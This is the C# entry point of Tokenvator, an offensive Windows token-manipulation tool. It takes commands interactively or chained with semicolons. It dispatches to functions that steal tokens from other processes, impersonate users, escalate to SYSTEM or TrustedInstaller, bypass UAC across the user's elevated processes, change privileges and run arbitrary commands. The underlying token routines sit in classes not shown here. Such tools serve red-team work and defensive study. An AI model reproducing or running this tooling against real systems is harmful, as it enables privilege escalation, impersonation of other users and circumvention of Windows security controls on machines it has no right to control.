using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Management.Instrumentation;
using System.Text;



////////////////////////////////////////////////////////////////////////////////
// https://github.com/clymb3r/PowerShell/blob/master/Invoke-TokenManipulation/Invoke-TokenManipulation.ps1
////////////////////////////////////////////////////////////////////////////////
namespace Tokenvator
{
    class Program
    {
        ////////////////////////////////////////////////////////////////////////////////
        // Put a loop here for chained commands - split on ;
        ////////////////////////////////////////////////////////////////////////////////
        static void Main(string[] args)
        {
            if (0 < args.Length)
            {
                using (System.IO.MemoryStream memeoryStream = new System.IO.MemoryStream())
                {
                    using (System.IO.StreamWriter streamWriter = new System.IO.StreamWriter(memeoryStream))
                    {
                        using (System.IO.StreamReader streamReader = new System.IO.StreamReader(memeoryStream))
                        {
                            String[] commands = String.Join(" ", args).Split(new String[] { ";" }, StringSplitOptions.RemoveEmptyEntries);
                            Int32 offset = 0;
                            foreach (String command in commands)
                            {
                                streamWriter.Write(command.Trim());
                                streamWriter.Flush();
                               
                                memeoryStream.Seek(offset, System.IO.SeekOrigin.Begin);
                                Console.SetIn(streamReader);

                                new MainLoop(false).Run();
                                offset += command.Trim().Length;
                            }
                        }
                    }
                }
                return;
            }

            MainLoop mainLoop = new MainLoop(true);
            while (true)
            {
                mainLoop.Run();
            }
        }

    }

    class MainLoop
    {
        private static String context = "(Tokens) > ";
        public static String[,] options = new String[,] { 
                {"GetSystem", "Command", "-"}, {"GetTrustedInstaller", "Command", "-"},
                {"Steal_Token", "Command", "ProcessID"},
                {"BypassUAC", "ProcessID", "Command"},
                {"List_Privileges", "ProcessID", "-"}, {"Set_Privilege", "ProcessID", "Privilege"},
                {"List_Processes", "-", "-"}, {"List_Processes_WMI", "-", "-"},
                {"Find_User_Processes", "-", "User"}, {"Find_User_Processes_WMI", "-", "User"},
                {"List_User_Sessions", "-", "-"},
                {"WhoAmI", "-", "-"}, {"RevertToSelf", "-", "-"},
                {"Run", "-", "Command"},
                {"", "", ""}
            };

        private IntPtr currentProcessToken;
        private Dictionary<String, UInt32> users;
        private Dictionary<UInt32, String> processes;

        private IntPtr hProcess;
        private Int32 processID;
        private String command;

        private TabComplete console;
        private Boolean activateTabs;

        public MainLoop(Boolean activateTabs)
        {
            this.activateTabs = activateTabs;
            if (activateTabs)
            {
                console = new TabComplete(context, options);
            }
        }

        internal void Run()
        {
            try
            {
                Console.Write(context);
                String input;
                if (activateTabs)
                {
                    input = console.ReadLine();
                }
                else
                {
                    input = Console.ReadLine();
                }

                switch (NextItem(ref input))
                {
                    case "list_privileges":
                        if (GetProcessID(input, out processID, out command))
                        {
                            hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, false, (UInt32)processID);
                            Console.WriteLine("[*] Recieved Handle {0}", hProcess.ToInt64());
                        }
                        else
                        {
                            hProcess = Process.GetCurrentProcess().Handle;
                        }

                        kernel32.OpenProcessToken(hProcess, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
                        Tokens.EnumerateTokenPrivileges(currentProcessToken);
                        kernel32.CloseHandle(currentProcessToken);
                        break;
                    case "set_privilege":
                        if (GetProcessID(input, out processID, out command))
                        {
                            hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, false, (UInt32)processID);
                            Console.WriteLine("[*] Recieved Handle {0}", hProcess.ToInt64());
                        }
                        else
                        {
                            hProcess = Process.GetCurrentProcess().Handle;
                        }
                        
                        kernel32.OpenProcessToken(hProcess, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
                        Tokens.SetTokenPrivilege(ref currentProcessToken, command);
                        kernel32.CloseHandle(currentProcessToken);
                        break;
                    case "list_processes":
                        users = Enumeration.EnumerateTokens(false);
                        Console.WriteLine("{0,-40}{1,-20}{2}", "User", "Process ID", "Process Name");
                        Console.WriteLine("{0,-40}{1,-20}{2}", "----", "----------", "------------");
                        foreach (String name in users.Keys)
                        {
                            Console.WriteLine("{0,-40}{1,-20}{2}", name, users[name], Process.GetProcessById((Int32)users[name]).ProcessName);
                        }
                        break;
                    case "list_processes_wmi":
                        users = Enumeration.EnumerateTokensWMI();
                        Console.WriteLine("{0,-40}{1,-20}{2}", "User", "Process ID", "Process Name");
                        Console.WriteLine("{0,-40}{1,-20}{2}", "----", "----------", "------------");
                        foreach (String name in users.Keys)
                        {
                            Console.WriteLine("{0,-40}{1,-20}{2}", name, users[name], Process.GetProcessById((Int32)users[name]).ProcessName);
                        }
                        break;
                    case "find_user_processes":
                        processes = Enumeration.EnumerateUserProcesses(false, input);
                        Console.WriteLine("{0,-30}{1,-30}", "Process ID", "Process Name");
                        Console.WriteLine("{0,-30}{1,-30}", "----------", "------------");
                        foreach (UInt32 pid in processes.Keys)
                        { 
                            Console.WriteLine("{0,-30}{1,-30}", pid, processes[pid]);
                        }
                        break;
                    case "find_user_processes_wmi":
                        processes = Enumeration.EnumerateUserProcessesWMI(input);
                        Console.WriteLine("{0,-30}{1,-30}", "Process ID", "Process Name");
                        Console.WriteLine("{0,-30}{1,-30}", "----------", "------------");
                        foreach (UInt32 pid in processes.Keys)
                        {
                            Console.WriteLine("{0,-30}{1,-30}", pid, processes[pid]);
                        }
                        break;
                    case "list_user_sessions":
                        Enumeration.EnumerateInteractiveUserSessions();
                        break;
                    case "getsystem":
                        GetSystem(input);
                        break;
                    case "gettrustedinstaller":
                        GetTrustedInstaller(input);
                        break;
                    case "steal_token":
                        StealToken(input);
                        break;
                    case "bypassuac":
                        BypassUAC(input);
                        break;
                    case "whoami":
                        Console.WriteLine("[*] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
                        break;
                    case "reverttoself":
                        if (advapi32.RevertToSelf())
                        {
                            Console.WriteLine("[*] Reverted token to {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
                        }
                        else
                        {
                            Console.WriteLine("[-] RevertToSelf failed");
                        }
                        break;
                    case "run":
                        Run(input);
                        break;
                    case "exit":
                        System.Environment.Exit(0);
                        break;
                    default:
                        Help();
                        break;
                }
                Console.WriteLine();
            }
            catch (Exception error)
            {
                Console.WriteLine(error.ToString());
            }
            finally
            {

            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Identifies a process to access
        ////////////////////////////////////////////////////////////////////////////////
        private static Boolean GetProcessID(String input, out Int32 processID, out String command)
        {
            String name = NextItem(ref input);
            command = String.Empty;

            if (name != input)
            {
                command = input;
            }

            processID = 0;
            if (Int32.TryParse(name, out processID))
            {
                return true;
            }

            Process[] process = Process.GetProcessesByName(name);
            if (0 < process.Length)
            {
                processID = process.First().Id;
                return true;
            }
            return false;
        }
        
        ////////////////////////////////////////////////////////////////////////////////
        // Pops an item from the input and returns the item - only used in inital menu
        // Taken from FowlPlay
        ////////////////////////////////////////////////////////////////////////////////
        public static String NextItem(ref String input)
        {
            String option = String.Empty;
            String[] options = input.Split(new String[] { " " }, StringSplitOptions.RemoveEmptyEntries);
            if (options.Length > 1)
            {
                option = options[0];
                input = String.Join(" ", options, 1, options.Length - 1);
            }
            else
            {
                option = input;
            }
            return option.ToLower();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void GetSystem(String input)
        {
            if ("getsystem" == NextItem(ref input))
            {
                using (Tokens t = new Tokens())
                {
                    t.GetSystem();
                }
            }
            else
            {
                using (Tokens t = new Tokens())
                {
                    t.GetSystem(input);
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void GetTrustedInstaller(String input)
        {
            if ("gettrustedinstaller" == NextItem(ref input))
            {
                using (Tokens t = new Tokens())
                {
                    t.GetTrustedInstaller();
                }
            }
            else
            {
                using (Tokens t = new Tokens())
                {
                    t.GetTrustedInstaller(input);
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void BypassUAC(String input)
        {
            Int32 processID;
            String command;

            if (GetProcessID(input, out processID, out command))
            {
                using (RestrictedToken rt = new RestrictedToken())
                {
                    rt.BypassUAC(processID, command);
                }
            }
            else
            {
                String name = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                Dictionary<UInt32, String> uacUsers = Enumeration.EnumerateUserProcesses(true, name);
                foreach (UInt32 pid in uacUsers.Keys)
                {
                    Console.WriteLine("\n[*] Attempting Bypass with PID {0} ({1})", pid, uacUsers[pid]);
                    using (RestrictedToken rt = new RestrictedToken())
                    {
                        rt.BypassUAC((Int32)pid, input);
                    }
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void StealToken(String input)
        {
            Int32 processID;
            String command;

            if (GetProcessID(input, out processID, out command))
            {
                if (String.IsNullOrEmpty(command))
                {
                    using (Tokens t = new Tokens())
                    {
                        t.ImpersonateUser(processID);
                    }
                }
                else
                {
                    using (Tokens t = new Tokens())
                    {
                        t.StartProcessAsUser(processID, command);
                    }
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void Run(String input)
        {
            Process process = new Process();
            process.StartInfo.FileName = NextItem(ref input);
            process.StartInfo.Arguments = input;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
            Console.WriteLine(process.StandardOutput.ReadToEnd());
            Console.WriteLine(process.StandardError.ReadToEnd());
            process.WaitForExit();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void Help()
        {
            Console.WriteLine("{0,-25}{1,-20}{2,-20}", "Name", "Optional", "Required");
            Console.WriteLine("{0,-25}{1,-20}{2,-20}", "----", "--------", "--------"); 
            for (Int32 i = 0; i < options.GetLength(0); i++)
            {
                Console.WriteLine("{0,-25}{1,-20}{2,-20}", options[i, 0], options[i, 1], options[i, 2]);
            }
        }
    }
}